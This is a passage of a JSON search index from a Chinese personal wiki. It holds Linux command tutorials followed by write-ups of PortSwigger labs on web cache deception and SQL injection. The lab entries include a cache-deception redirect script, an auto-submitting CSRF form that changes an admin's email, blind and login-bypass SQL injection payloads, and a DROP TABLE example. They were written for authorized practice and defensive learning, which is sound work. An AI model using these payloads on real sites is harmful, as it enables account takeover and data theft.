按地址和规则编辑流 wc 统计行、单词和字节数 从 /etc/passwd 提取用户名、UID 和登录 Shell： awk -F: print $1 , $3 , $7 /etc/passwd 排除 nologin 和 false，同时输出结果并统计行数： grep -Ev (nologin|false)$ /etc/passwd \\ | awk -F: print $1 , $3 , $7 \\ | tee /dev/tty \\ | wc -l 基本与扩展正则表达式grep 默认使用基本正则表达式，grep -E 使用扩展正则表达式。是否需要转义圆括号、花括号和 | 取决于所选模式。 grep -E ^(root|www-data): /etc/passwdgrep -E [0-9]2,4 file.txtgrep -F literal.*text file.txt grep -F 把模式作为固定字符串处理。. 匹配任意单个字符，.* 表示任意长度字符序列，并不是逻辑与运算符。 文本工具按行和字节处理时会受到 locale、编码、空字符和换行规则影响。处理任意文件名时不能依赖换行分隔，应使用 find -print0 与支持 -0 的下游工具。 参考资料 GNU Findutils Manual GNU Grep Manual Bash Redirections","tags":[null,null,null]},{"title":"Linux 路径、目录与文件操作","path":"/wiki/linux/linux-03-paths-and-files.html","content":"Linux 路径由 / 分隔。以 / 开头的是绝对路径，其余路径相对于进程当前工作目录解析。. 表示当前目录，.. 表示父目录，~ 则由 Shell 展开为用户主目录。 当前目录与路径解析pwdlsls -la /etccd /var/logcd ..cd ~cd - cd - 返回上一个工作目录。文件名以 . 开头时通常被 ls 默认隐藏，但这只是命名约定，不是额外的访问控制。 Shell 在执行外部命令时按 PATH 环境变量中的目录顺序查找。当前目录通常不在 PATH 中，因此运行当前目录下的程序需要写出相对路径： ./app 创建文件和目录touch 的主要作用是更新时间戳；目标不存在时才会创建空文件： touch notes.txtmkdir projectmkdir -p project/src/include mkdir -p 会按需创建缺失的父目录，并允许已存在的目录继续参与路径创建。 复制、移动与删除cp notes.txt project/cp -a project project-backupmv notes.txt README.txtmv README.txt project/rm project/README.txtrmdir empty-directory mv 在同一文件系统内通常通过重命名目录项完成；跨文件系统移动则需要复制数据后删除源文件。cp -a 尽量保留递归目录结构、权限、时间和符号链接等属性，但 ACL、扩展属性和稀疏文件的处理仍需结合平台与选项验证。 rm 默认不进入目录，递归删除需要 -r。命令行删除通常不会经过桌面回收站，通配符展开后也不会再次确认匹配范围。执行递归删除前可以先用 printf %s pattern* 或 find 检查实际目标。 文件类型与元数据ls -l 的第一个字符表示目录项类型，后续九位表示权限： -rw-r--r-- regular-filedrwxr-xr-x directorylrwxrwxrwx symbolic-link file 根据内容特征识别文件类型，stat 显示 inode、大小、权限和时间戳： file ./appstat ./app 文件扩展名不是 Linux 内核判断可执行性的依据。可执行文件需要符合相应格式、拥有执行权限，并由内核或 shebang 指定的解释器装载。 符号链接与硬链接ln original hard-linkln -s original symbolic-link 硬链接是同一文件 inode 的另一个目录项，不能跨文件系统，通常也不允许普通用户为目录创建硬链接。符号链接保存目标路径，可以跨文件系统，但目标移动或删除后会变成悬空链接。 参考资料 GNU Coreutils Manual Linux path_resolution(7)","tags":[null,null,null]},{"title":"Linux 软件包、进程、服务与任务调度","path":"/wiki/linux/linux-07-packages-processes-scheduling.html","content":"软件包管理、进程控制、服务管理和任务调度处于不同层次。APT 维护软件安装状态，内核管理进程和信号，systemd 管理单元生命周期，Cron 和 systemd timer 负责按时间触发任务。 APT 与 dpkgDebian 系发行版使用 .deb 软件包。dpkg 操作本地包数据库和单个包文件，APT 在其上处理仓库索引、依赖关系与下载。 sudo apt updateapt search nginxapt show nginxsudo apt install nginxdpkg -L nginxdpkg -S /usr/sbin/nginx apt update 只刷新软件包索引，不会升级已安装软件。dpkg -i package.deb 不会像 APT 一样自动从仓库解析全部依赖，安装本地包时可使用 apt install ./package.deb 让 APT 参与依赖处理。 git clone 获取的是版本库内容，不是系统软件包安装。它不会自动安装依赖、注册包数据库或配置服务。 进程与信号ps auxpgrep -a sshdtopkill pidkill -TERM pidkill -KILL pid 不带参数的 kill 默认发送 SIGTERM，允许程序执行清理。SIGKILL 无法被捕获、阻塞或忽略，应留给进程无法响应正常终止的情况；它可能留下未完成写入、临时文件或外部状态。 Shell 中的 把命令放到后台，jobs、fg、bg 管理当前 Shell 的作业。Shell 作业控制与 systemd 服务不是同一套生命周期机制。 systemd 服务systemd 使用 unit 描述服务、挂载、Socket、路径和计时器等对象： systemctl status sshsudo systemctl start sshsudo systemctl stop sshsudo systemctl enable --now sshjournalctl -u ssh --since today start 影响当前运行状态，enable 建立开机启动依赖，二者可以独立使用。服务实际名称因发行版和软件包而异，例如 OpenSSH 在 Debian 系常用 ssh.service，其他系统可能使用 sshd.service。 systemd 广泛用于现代 Linux 发行版，但不是 Solaris 的服务管理器，也不是所有 Linux 系统的默认选择。 systemd timersystemd timer 由 .timer 和被触发的 .service 配合： [Unit]Description=Run backup daily[Timer]OnCalendar=dailyPersistent=true[Install]WantedBy=timers.target Persistent=true 可以在设备错过计划时间后，于下次启动补执行一次。启用后可检查调度状态： sudo systemctl enable --now backup.timersystemctl list-timers Cron用户级任务通过 crontab -e 配置： 15 2 * * * /home/user/bin/backup.sh /home/user/log/backup.log 21 Cron 环境通常比交互式 Shell 简单，PATH、当前目录和环境变量可能不同。脚本应使用绝对路径、明确解释器并处理并发执行和退出状态。 systemd timer 便于集成日志、依赖和失败状态；Cron 配置简单且广泛可用。选择取决于目标系统的初始化环境与任务要求。 参考资料 Debian Administrator’s Handbook: Package Management systemd.timer Linux signal overview","tags":[null,null,null,null]},{"title":"Vim 模式、移动与文本修改","path":"/wiki/linux/linux-04-vim.html","content":"Vim 是模式编辑器。同一按键在普通模式、插入模式、可视模式和命令行模式中具有不同含义，编辑动作通常由“操作符 + 移动范围”组合而成。 模式切换与保存退出Vim 启动后进入普通模式。i 在光标前进入插入模式，a 在光标后插入，o 在下方新建一行。按 Esc 返回普通模式。 命令 行为 :w 保存当前文件 :q 在没有未保存修改时退出 :wq 保存并退出 :q! 放弃本次修改并退出 :help command 打开指定命令的帮助 移动与操作符普通模式中，h、j、k、l 分别向左、下、上、右移动。常用范围命令包括： 命令 范围 w b 下一个词首 上一个词首 e 当前或下一个词尾 0 ^ 行首 第一个非空字符 $ 行尾 gg G 文件首行 文件尾行 42G 或 :42 第 42 行 数字可以重复动作，例如 3w 向前移动三个单词。删除操作符 d 与范围组合后得到 dw、d$、dd；修改操作符 c 会删除范围并进入插入模式，例如 ce 和 c$。 x 删除光标所在字符，rchar 替换一个字符，R 进入连续替换模式。p 把最近删除或复制的文本放到光标后，u 撤销，Ctrl-r 重做。 搜索与替换/pattern 向前搜索，?pattern 向后搜索。n 沿当前方向查找下一个匹配，N 反向查找。% 可以在配对的括号、方括号或花括号之间跳转。 命令行模式中的替换命令： :s/old/new/:s/old/new/g:%s/old/new/g:%s/old/new/gc 第一条只替换当前行的第一个匹配，g 表示处理该范围内每行的全部匹配，% 选择整个文件，c 要求逐项确认。 文件与外部命令命令行模式可以读写其他文件或调用外部命令： :w output.txt:r other.txt:!ls:r !date :r file 把文件内容插入光标下一行，:r !command 插入外部命令的输出。外部命令的可用性和权限仍由当前 Shell 环境决定。 插入方式与选项o、O 分别在当前行下方和上方插入新行，A 在行尾进入插入模式。搜索选项可以临时设置： :set ignorecase:set incsearch:set hlsearch:set noignorecase 持久设置可以写入 ~/.vimrc。配置名称和默认值可能因 Vim 版本、发行版和插件而异，:set option? 可以查看当前值。 内置帮助:help 打开帮助窗口，:help d、:help :substitute 等命令可以定位普通模式按键或 Ex 命令。Ctrl-w Ctrl-w 在窗口之间切换，:q 关闭当前帮助窗口。 系统自带的 vimtutor 通过临时练习文件演示这些操作，不会修改教程原文件。把复杂编辑拆成移动范围、操作符和重复次数三部分，更容易判断命令实际影响的文本。 参考资料 Vim Documentation Vim Tutor","tags":[null,null,null]},{"title":"Linux 文件权限、所有权与用户管理","path":"/wiki/linux/linux-06-permissions-and-users.html","content":"传统 Unix 权限模型为每个文件记录所有者 UID、所属组 GID，以及 owner、group、other 三组权限位。访问结果还会受到目录权限、ACL、能力、挂载选项和安全模块策略影响。 读取权限字符串-rw-r--r-- 1 root root 1641 May 4 23:42 /etc/passwd│└┬┘└┬┘└┬┘ │ ││ │ │ │ owner group│ │ │ └─ other│ │ └──── group│ └─────── owner└───────── file type 普通文件上的 r、w、x 表示读取内容、修改内容和作为程序执行。目录权限含义不同：r 允许读取目录项名称，w 允许增删目录项，x 允许穿过目录并访问已知名称。 删除文件主要取决于父目录的写和执行权限，而不是文件自身的写权限。带 sticky bit 的 /tmp 等目录还会限制用户删除他人的目录项。 符号模式与八进制模式chmod u+x script.shchmod g-w report.txtchmod a+r public.txtchmod 754 script.sh 八进制值由 r=4、w=2、x=1 相加： 7 = rwx5 = r-x4 = r-- chmod 754 因此得到 rwxr-xr--。递归修改权限会同时影响普通文件和目录，而二者对执行位的含义不同；批量处理时通常用 find -type f 和 find -type d 分开设置。 修改所有权sudo chown alice:developers report.txtsudo chown -R alice:developers project/ 普通用户通常不能把文件所有权转移给任意用户。递归 chown 还需要注意符号链接和挂载点边界，避免把系统目录或外部文件系统纳入范围。 用户与组 命令 用途 id user 查看 UID、主组和附加组 getent passwd user 通过 NSS 查询账户信息 useradd userdel 创建或删除账户 usermod 修改账户和组成员关系 passwd 设置或锁定密码 groupadd groupdel 创建或删除组 su 切换用户并启动 Shell sudo 按 sudoers 策略以其他身份执行命令 Debian 系还提供交互性更强的 adduser 和 deluser。它们与底层 useradd、userdel 的默认行为并不完全相同。 特殊权限与 ACLsetuid、setgid 和 sticky bit 位于额外的权限位中。可执行文件的 setuidsetgid 会影响进程的有效身份；目录的 setgid 会让新目录项继承组；sticky bit 常用于共享可写目录。 find / -perm -4000 -type f 2/dev/nullgetfacl filesetfacl -m u:alice:rw file ACL 可以为特定用户和组增加权限条目。最终权限还要结合 ACL mask 计算，不能只看 ls -l 的九个传统权限字符。 参考资料 Linux chmod(2) Linux acl(5)","tags":[null,null,null]},{"title":"Linux 网络服务、备份与文件系统","path":"/wiki/linux/linux-08-network-backup-filesystems.html","content":"网络服务决定主机对外暴露的接口，备份负责在故障后恢复数据，文件系统负责组织和持久化数据。三者都需要同时考虑权限、传输安全和恢复验证。 SSHOpenSSH 使用加密连接提供远程 Shell、端口转发和文件传输： ssh user@serverscp file user@server:/srv/data/sftp user@serversystemctl status ssh 服务端通常读取 /etc/ssh/sshd_config，但发行版可能通过 Include 加载额外配置。修改后应先执行 sshd -t 检查语法，再平滑重载服务，避免把自己锁在远程主机之外。 公钥登录减少共享密码暴露，但私钥本身仍需权限保护和口令加密。禁用密码登录前必须验证至少一种可用的管理入口。 NFSNFS 把远端目录挂载到本地命名空间： sudo mount -t nfs server:/srv/share /mnt/share 服务端的 /etc/exports 定义导出路径、客户端范围和选项。root_squash 会把客户端 root 映射为低权限身份，是常见默认保护；no_root_squash 允许客户端 root 在共享目录中保留高权限，配置不当会扩大权限提升风险。 NFS 的身份与权限语义依赖版本、认证方式和 UIDGID 映射。仅限制客户端 IP 不能替代强认证和网络分段。 临时 HTTP 文件服务Python 可以在当前目录启动简易 HTTP 服务： python3 -m http.server 8000 --bind 127.0.0.1 该服务默认公开当前目录内容，不提供生产级身份认证、TLS、访问控制和上传管理。绑定 0.0.0.0 会向所有可达接口监听，使用前需要确认目录内容、防火墙和实验网络范围。 Apache、Nginx 等正式 Web 服务器拥有独立站点配置、日志、权限和 TLS 机制，不能用 Python 简易服务器的行为概括。 VPN 与实验网络OpenVPN 客户端根据 .ovpn 配置建立加密隧道并安装路由： sudo openvpn --config lab.ovpn 配置文件可能包含客户端证书、私钥或访问令牌，不应公开。连接成功还需要检查隧道接口和目标网段路由，而不是只看进程是否仍在运行。 使用 rsync 复制数据rsync -a --info=progress2 /source/ user@server:/backup/source/ 源路径末尾的 / 会影响目标目录结构。-a 组合保留许多常用属性，但不自动等于完整系统备份；ACL、扩展属性、硬链接、稀疏文件和跨平台所有权需要额外选项与验证。 rsync 可以跳过未变化文件，并在合适条件下使用增量传输算法。SSH 负责远程传输加密： rsync -a -e ssh /source/ user@server:/backup/source/ 同步会把删除、损坏或勒索后的状态传播到副本，因此同步副本不能替代具有版本、保留策略和离线隔离的备份。备份流程还需要定期执行恢复测试。 Duplicity 使用 librsync、归档卷和 GnuPG 提供增量加密备份；Deja Dup 是基于 Duplicity 的图形前端。它们并不是在 rsync 命令上简单增加加密。 常见文件系统 文件系统 特点与常见场景 ext4 成熟的通用日志文件系统，广泛用于 Linux 主机 XFS 擅长并行 IO 和大规模文件系统，常见于服务器 Btrfs 写时复制、校验、子卷和快照，运维模型与传统文件系统不同 ext2 无日志的旧式文件系统，现代通用部署较少 NTFS Windows 原生文件系统，Linux 通过相应驱动实现互操作 文件系统选择还受内核和工具版本、存储设备、崩溃恢复目标、快照需求、工作负载和运维经验影响。“支持大文件”或“性能高”不足以单独决定选择。 普通文件、目录和符号链接只是常见目录项类型。Linux 还存在设备节点、FIFO 和 Socket；可以用 stat 或 find -type 区分。 参考资料 OpenSSH Manual Pages Linux NFS exports rsync Manual Linux Filesystems Documentation","tags":[null,null,null,null]},{"title":"靶场实战","path":"/wiki/pentest/index.html","content":"PortSwigger、Hack The Box、pwn.college 等授权靶场的实战记录。"},{"title":"Lab: Exploiting exact-match cache rules for web cache deception","path":"/wiki/pentest/lab-exploiting-exact-match-cache-rules-for-web-cache-deception.html","content":"实验：利用精确匹配缓存规则欺骗 Web 缓存 实验链接：https://portswigger.net/web-security/web-cache-deception/lab-wcd-exploiting-exact-match-cache-rules 在 Proxy HTTP 历史记录中，注意 my-account 响应中的电子邮件更改提交表单包含一个 CSRF 令牌作为隐藏参数。 测试路径映射和拼接情况： 将my-accout 后缀加入abc或直接加abc 测试发现皆返回404 Not Found 尝试输入隔断符； ？ 结果： 将请求转发到Intruder 并尝试添加输入 发现?和;都会返回200 但是发现普通静态扩展名不足以利用 无法获取到所需缓存规则利用精准匹配规则进行测试robots.txt 添加%2f测试缓存是否会路径规范化(..%2f ..) 缓存服务器将响应缓存了 这与源站的处理方式不一定相同 于是便有了可利用点 诱导管理员缓存自己的账户页 输入js脚本： document.location=https://YOUR-LAB-ID.web-security-academy.net/my-account;%2f%2e%2e%2frobots.txt?wcd 但是发现 仍然是得到用户wiener 的信息 -该URL已经被污染了 更换全新的值 且不能提前访问URL 先Store 再发送 立刻再在 Repeater 发my-account;%2f%2e%2e%2frobots.txt?wcd-483026 的请求 命中并得到 管理员的csrf：JPkWDHimD3yyN0wZG56CoFNMYSUb3lg7 下面就需要利用这个CSRF令牌 来修改别的邮箱信息 官方的办法是找到请求并Engagement tools - Generate CSRF PoC但我并没有Burp pro 于是利用GPT生成CSRF令牌的漏洞利用脚本 html body form action=https://YOUR-LAB-ID.web-security-academy.net/my-account/change-email method=POST input type=hidden name=email value=新的示例邮箱 input type=hidden name=csrf value=上面得到的管理员的CSRF /form /body script document.forms[0].submit();\t/script/html gpt给出利用新邮箱的理由： 这个 POST 会在 administrator 的浏览器里执行，目标是修改 administrator 账户的 email。email 字段只需要是一个合法邮箱格式，最好用一个没用过的新值，避免和已有账户邮箱冲突或让你误判是否成功。 提交验证 解决实验 本次实验流程回顾漏洞点本实验的漏洞点来自三类解析差异叠加： 1. 源站服务器把 ; 当作路径分隔符2. 缓存服务器不按源站的方式处理 ;3. 缓存服务器会规范化编码路径，并存在 /robots.txt 精确匹配缓存规则 最终导致同一个 URL 在两层服务器眼里含义不同： /my-account;%2f%2e%2e%2frobots.txt?wcd 源站服务器视角： ; 是路径分隔符只处理 /my-account返回当前登录用户的账户页面 缓存服务器视角： 规范化 %2f%2e%2e%2f 为 /../最终匹配到 /robots.txt认为这是可缓存资源 于是出现关键错位： 源站返回私密账户页缓存却按 /robots.txt 规则保存了这个响应 复用原理这类漏洞的复用思路不是固定使用 /robots.txt，而是寻找缓存层认可的可缓存目标。常见探测目标包括： /robots.txt/favicon.ico/sitemap.xml/index.html 如果某个路径第一次 miss、第二次 hit，就说明它可能被缓存规则命中。随后再寻找源站和缓存层在路径分隔符、URL 编码、路径规范化上的解析差异，将敏感动态页面伪装成缓存层认可的静态或固定资源。 结论本实验的本质是： 通过路径分隔符差异让源站返回敏感页面通过路径规范化差异让缓存误判为 /robots.txt通过精确匹配缓存规则保存敏感响应通过缓存读取 administrator 页面中的 CSRF token再组合 CSRF 修改 administrator 邮箱 Web cache deception 的危害不局限于“泄露页面内容”。只要被缓存的页面中包含敏感数据，例如 API key、CSRF token、个人信息、订单信息或后台操作参数，攻击者就可以进一步扩大影响。本实验正是从“缓存泄露”升级到“账户操作劫持”的典型案例。","tags":[null,null,null,null]},{"title":"Lab: Blind SQL injection with conditional responses","path":"/wiki/pentest/lab-blind-sql-injection-conditional-responses.html","content":"Lab: Blind SQL injection with conditional responses实验：带条件响应的盲注 SQL 注入 链接：https://portswigger.net/web-security/sql-injection/blind/lab-conditional-responses 进入主页再刷新后会发现页面出现 welcome back!的标识-表明该站点的cookie已被源站收录存放到缓存服务器中 我们拦截下请求 验证存在漏洞在实验介绍里提到该环境下存在盲注SQL注入漏洞，数据库中有一个名为 users 的独立表，包含 username 和 password 两列，我们可以先验证下漏洞的存在。 -- 模拟SQL传入cookie验证的过程SELECT tracking-id from tracking-table where trackingId = yDTuE00jlg59ihqm-- 在上图中返回了Welcome back!，说明tracking-id是真实的，所以我们可以对SQL添加附加条件，并通过页面是否返回 Welcome back!来判断成功 -- 验证存在盲注SQL-- 当处理包含 TrackingId 的 Cookie 的请求时，应用程序根据注入的条件触发不同的响应，从而获取信息-- 例如上面的查询-- 如果tracking-id存在 - 返回 Welcome back!-- 如果tracking-id不存在 - 不返回 Welcome back!query1SELECT tracking-id from tracking-table where trackingId = yDTuE00jlg59ihqm and 1=1-- query2 SELECT tracking-id from tracking-table where trackingId = yDTuE00jlg59ihqm and 1=2-- 验证users用户表和administrator管理员账户的存在 利用同样的方式先判断users表存在 SELECT tracking-id from tracking-table where trackingId = yDTuE00jlg59ihqm and (select x from users LIMIT 1)=x-- 再判断administrator存在 SELECT tracking-id from tracking-table where trackingId = yDTuE00jlg59ihqm and (select username from users where username=administrator)=administrator-- 枚举密码首先要知道密码的长度，我们可以利用LENGTH函数 SELECT tracking-id from tracking-table where trackingId = yDTuE00jlg59ihqm and (select username from users where username=administrator and LENGTH(password)1)=administrator---- 这里是尝试密码位数大于1 还是如果页面返回了Welcome back! 证明测试的内容正确 一个个数字去尝试太过于麻烦，可以通过Intruder来做枚举 那现在需要知道密码的每位具体值，实验的Hint里提到:可以假设密码仅包含小写字母和数字字符。 这里需要用到SUBSTRING函数，根据上个实验知道这里用的是PostgreSQL Oracle 甲骨文 SUBSTR(foobar, 4, 2) Microsoft 微软 SUBSTRING(foobar, 4, 2) PostgreSQL SUBSTRING(foobar, 4, 2) MySQL SUBSTRING(foobar, 4, 2) SELECT tracking-id from tracking-table where trackingId = yDTuE00jlg59ihqm and (select substring(password,1,1) from users where username=administrator)=a-- 得到密码：wuftgplgknnxsumfxhuc 进入登录界面输入密码完成实验","tags":[null,null,null,null]},{"title":"Lab: Exploiting cache server normalization for web cache deception","path":"/wiki/pentest/lab-exploiting-cache-server-normalization-for-web-cache-deception.html","content":"实验：利用缓存服务器规范化进行 Web 缓存欺骗 链接：https://portswigger.net/web-security/web-cache-deception/lab-wcd-exploiting-cache-server-normalization 登录进入账户页 测试路径分隔符 其实我觉得这里应该不生效才对 上面测试了#在源站和缓存服务器里都作为了路径分隔符，在缓存服务器视角会把路径同样抽象为my-account从而无法命中后面resources静态资源目录的缓存规则。 下面是询问Gpt5.5的解释： 这里提到在Burp的中继里和我们在实际网络中的区别： 在实际网络中存在可能会把#字符过滤! [!NOTE] 在URL中，由于#、?和/等字符被保留用于特定功能（如定位书签、区分参数、分隔路径），因此作为参数值传递时，会对其进行URL编码为什么要转义？ 当链接中包含这类特殊符号时，系统会将它们误认为是URL本身的结构代码。例如，如果直接传递包含 / 的路径，会被当作多层目录解析。将其转化为十六进制的ASCII码（ % 加上对应的十六进制值）后，服务器就能将它们作为普通文本正确识别并读取。 这也成为我们做URL欺骗时混淆源站和缓存服务器的利器，常见转义符如下： %2f 表示目录分隔符 ? %3f 表示URL和参数的分隔符 # %23 表示网页中的锚点（如书签） %20 用于连接参数 % %25 百分号自身 漏洞利用实践","tags":[null,null,null,null]},{"title":"Lab: Exploiting origin server normalization for web cache deception","path":"/wiki/pentest/lab-exploiting-origin-server-normalization-for-web-cache-deception.html","content":"实验：利用源服务器规范化进行 Web 缓存欺骗 链接：https://portswigger.net/web-security/web-cache-deception/lab-wcd-exploiting-origin-server-normalization 登录进入个人账户页面 将my-account请求发送到Repeater和Intruder做测试 将请求转发到Intruder里遍历测试路径分隔符 回到中继对?测试 设计漏洞利用脚本 [!NOTE] 其实访问resources..%2fmy-account 也可得到相同结果 对应?… ?是我们测试出来的路径分隔符 可以在源站和缓存服务器中使用 加入?和后面的数据是为了对URL做增添 思考以下这种情况： 我们在实验里发现了静态资源可以存储 并在测试中使用了resources..%2fmy-account的路径做测试 - 做漏洞利用时没有干净的URL提供给受攻击者 ，其可能访问到我们之前做测试的网页数据信息","tags":[null,null,null,null]},{"title":"Lab: Exploiting path delimiters for web cache deception","path":"/wiki/pentest/lab-exploiting-path-delimiters-for-web-cache-deception.html","content":"实验：利用路径分隔符欺骗网页缓存 链接：https://portswigger.net/web-security/web-cache-deception/lab-wcd-exploiting-path-delimiters 登录到个人账户页 与Lab1一样API Key是明文显示的 Intruder遍历测试 回到中继器 测试两个路径分隔符的差异 去漏洞利用服务器做复现","tags":[null,null,null,null]},{"title":"Lab: Exploiting path mapping for web cache deception","path":"/wiki/pentest/lab-exploiting-path-mapping-for-web-cache-deception.html","content":"实验：利用路径映射欺骗网页缓存 链接：https://portswigger.net/web-security/web-cache-deception/lab-wcd-exploiting-path-mapping 进入实验主页并登录到个人账户页 对请求做测试 去漏洞利用服务器复现 注： 这里不能用之前在中继里做尝试的abc.js做漏洞利用 因为该请求已被服务器响应过 - 发送后Carlos可能会拿到之前我们做尝试的内容 即我们账户的信息 将Carlos的API Key提交到 Submit solution 即可完成实验","tags":[null,null,null,null]},{"title":"Lab: SQL injection vulnerability allowing login bypass","path":"/wiki/pentest/lab-sql-injection-login-bypass.html","content":"实验：SQL注入漏洞允许绕过登录 链接：https://portswigger.net/web-security/sql-injection/lab-login-bypass 进入登录界面 原理十分简单 #原SQLSELECT * FROM users WHERE username = wiener AND password = bluecheese#注入后SELECT * FROM users WHERE username = administrator-- AND password = 后台只读取到amdinistrator用户要登陆 而忽略了对密码的要求 现代 Java 后端中的 SQL 注入风险其实到这里实验已经结束了，但是在现代化设计下如演示的漏洞基本不可能存在 但是我懒得再写一篇，就结合SQL注入和我之前学到的JAVA后端体系知识说下现代化的后端设计是如何防止SQL注入的 靶场中的漏洞通常来自这种写法： SELECT * FROM users WHERE username = 输入值 AND password = 输入值 用户输入被直接拼进 SQL 字符串，所以 OR 1=1-- 能改变原本的查询逻辑。 从 JDBC 开始，后端开发就已经有了更标准的处理方式：使用参数化查询。 String sql = select * from user where username=? and password=?;PreparedStatement ps = conn.prepareStatement(sql);ps.setString(1, username);ps.setString(2, password); 在这种模式下，username 和 password 会被数据库驱动当作“参数值”处理，而不是 SQL 语法的一部分。即使用户输入： OR 1=1-- 它也只是一个普通字符串，不会变成查询条件。 MyBatis 里的 # 也是类似的做法： SELECT * FROM user WHERE username = #username # 会生成预编译参数，能有效防止普通值位置的 SQL 注入。因此，在规范使用 PreparedStatement、MyBatis #、Spring Data JPA 参数绑定、jOOQ 条件构造器的情况下，靶场中最基础的登录绕过在现代项目里基本不会出现。 不过，这并不代表 SQL 注入已经消失了。它只是从“用户名密码拼接”转移到了更隐蔽的动态 SQL 场景中。 现代 Java 里的主流数据访问方式 现在常见组合是： Spring Boot 3.x / 4.xSpring SecuritySpring Data JPA / HibernateMyBatis / MyBatis-PlusjOOQ / QueryDSLJdbcTemplate / NamedParameterJdbcTemplate 所以只要使用参数绑定，SQL 注入风险就很低： // JDBC / JdbcTemplate 风格select * from user where username = ?// MyBatisWHERE username = #username// JPAwhere u.username = :username// jOOQUSER.USERNAME.eq(username) Spring Data JPA、jOOQ 这类工具的作用是减少手写 SQL 拼接。Spring Data JPA 官方支持通过方法名、@Query 和参数绑定构造查询；jOOQ 默认也支持 bind values。参考：Spring Data JPA Query MethodsjOOQ Bind Values 现代项目仍然会出现 SQL 注入的位置 普通登录密码参数上很少，大部分在“不能直接用占位符的 SQL 结构位置”。 典型高风险点： 动态 ORDER BY 动态表名 字段名 动态排序方向 ASC DESC 报表系统的自定义筛选 后台高级搜索 多租户 schematable 拼接 MyBatis ${} JPAHibernate nativeQuery 拼接 MyBatis-Plus applylastinSql 等原生片段 存储过程内部拼动态 SQL 跟 Java 后端跟贴合的是： MyBatis ${} 注入 JPA nativeQuery 字符串拼接 Hibernate HQL 拼接 后台列表排序参数注入 报表筛选条件注入 MyBatis-Plus 原生 SQL 片段滥用 挨个展开说下 MyBatis $ 注入MyBatis 中需要提防的是 $。它和 # 完全不同， $ 是字符串替换，用户传入什么，SQL 里就拼入什么。 ORDER BY $sort 如果 sort 来自请求参数，就可能变成： ORDER BY id desc; DROP TABLE user; 这不能用普通参数绑定解决，因为列名、表名、排序方向本身属于 SQL 结构。正确做法是做白名单映射： 前端传 price - 后端映射为 price前端传 time - 后端映射为 created_at其他值直接拒绝 例如: switch (sort) case price: column = price; break; case time: column = created_at; break; default: throw new IllegalArgumentException(); JPA nativeQuery 字符串拼接Spring Data JPA 本身的参数绑定是安全的： @Query(select u from User u where u.username = :username) 但如果使用 nativeQuery 并手动拼接字符串，风险会重新出现： String sql = select * from user where name = + name + ; JPA 并不会自动拯救这种写法。只要回到字符串拼接，风险就和原始 JDBC Statement 一样。 Hibernate HQL 拼接Hibernate 的 HQL JPQL 不是原生 SQL，但它同样是一种查询语言。如果拼接用户输入，也可能产生 HQL 注入： String hql = from User where username = + username + ; 正确方式仍然是参数绑定： from User where username = :username 所以 ORM 不是免疫 SQL 注入，而是提供了更安全的写法。安全取决于开发者有没有绕回字符串拼接。 后台列表排序参数注入现代后台系统经常对列表页做排序管理，如： 按价格排序 按时间排序 按销量排序 其他升序 降序规则 这些字段最终会进入： ORDER BY created_at DESC 问题是，ORDER BY 后面的列名和方向通常不能用 ? 绑定。如果直接接收前端参数： ORDER BY $column $direction 就会产生注入风险。 正确方式是： column 只能来自固定枚举direction 只能是 ASC 或 DESC 也就是说，排序参数必须做白名单，而不是简单过滤特殊字符。 报表筛选条件注入报表系统、数据看板、高级搜索是现实中更容易出问题的地方。因为它们经常允许用户组合条件： 时间范围 状态 部门 金额区间 模糊搜索 自定义字段 为了灵活和响应效率，后端的开发者经常会动态拼 SQL： sql += AND + field + = + value + ; 其中 value 可以参数化，但 field 不能直接相信。字段名、操作符、排序列甚至聚合函数都必须做白名单控制。 MyBatis-Plus 原生 SQL 片段滥用MyBatis-Plus 简化了 CRUD，但它也提供了一些能插入原生 SQL 片段的方法，例如 last()、apply()、inSql() 等。如果这些方法接收了用户输入，就会绕开参数化保护。 危险模式类似： queryWrapper.last(order by + userInput);queryWrapper.apply(date_format(create_time,%Y-%m) = + input); 这类API 不是不能用，而是不能直接接收外部输入。它们适合的地方是写固定 的SQL 片段，而不是拼接请求参数。 现代登录接口的真实做法规范化的现代登录不会写： WHERE username = ? AND password = ? 合理的流程是： 根据 username 查询用户 取出数据库中的 password hash 使用 BCrypt Argon2 等算法校验密码 校验成功后创建 session 或 token 例如： User user = userMapper.findByUsername(username); //根据 username 查询用户passwordEncoder.matches(rawPassword, user.getPasswordHash()); //取出数据库中的 password hash，然后使用算法校验密码做匹配//校验成功后创建session 或 token 现代实现常换成 Spring Security 的 PasswordEncoder，比如 BCrypt、Argon2 这类自适应哈希。 参考：Spring Security Password Storage。 数据库中不保存明文密码。即使 SQL 注入被防住，如果密码明文存储，仍然是不合格的安全设计。","tags":[null,null,null,null]},{"title":"Lab: SQL injection vulnerability in WHERE clause allowing retrieval of hidden data","path":"/wiki/pentest/lab-sql-injection-retrieve-hidden-data.html","content":"实验：WHERE 子句中的 SQL 注入漏洞允许检索隐藏数据 链接：https://portswigger.net/web-security/sql-injection/lab-retrieve-hidden-data // 举我以前写的的代码实例 看下在JAVA后端的流程 @GetMapping(/id) @ResponseBody public Book getBook(@PathVariable Integer id) return bookService.getById(id); // controller层 Book getById(Integer id); // service层\t@Override public Book getById(Integer id) return bookMapper.findById(id); // service接口实现 /* 按id(主键)查询 */ Book findById(@Param(id) Integer id); // mapper层\tselect id=findById resultType=com.java.pojo.Book SELECT * FROM book WHERE id = #id /select// 这个id 通过传参后返到后端 校验后传回到数据库处理服务 // 这里的id和图片上的category同样是做WHERE子句的限制条件 #我们考虑注入攻击 -- 原始查询sql如下 限制条件是 类别= 礼物 加上 发布=1 （1一般是代表true，0代表flase）SELECT * FROM products WHERE category = Gifts AND released = 1-- 如果我们想去掉relaesed的影响就需要在 category的类别中注入 -- 等字符 隔断sql语句#加入--SELECT * FROM products WHERE category = Gifts-- AND released = 1 #加入 OR 1=1 -- SELECT * FROM products WHERE category = Gifts OR 1=1 -- AND released = 1#删掉gifts加入 OR 1=1 --SELECT * FROM products WHERE category = OR 1=1 -- AND released = 1 首先是返回了结果 说明sql的代码存在注入漏洞可以恶意写入代码 现在查到的是所有的gifts底下的产品 但不是全部产品所以我们还需要消除gifts的影响","tags":[null,null,null,null]},{"title":"Lab: SQL injection with filter bypass via XML encoding","path":"/wiki/pentest/lab-sql-injection-filter-bypass-xml-encoding.html","content":"实验：利用 XML 编码绕过过滤器进行 SQL 注入 链接：https://portswigger.net/web-security/sql-injection/lab-sql-injection-with-filter-bypass-via-xml-encoding 进入主页","tags":[null,null,null,null]},{"title":"Lab: SQL injection UNION attack, determining the number of columns returned by the 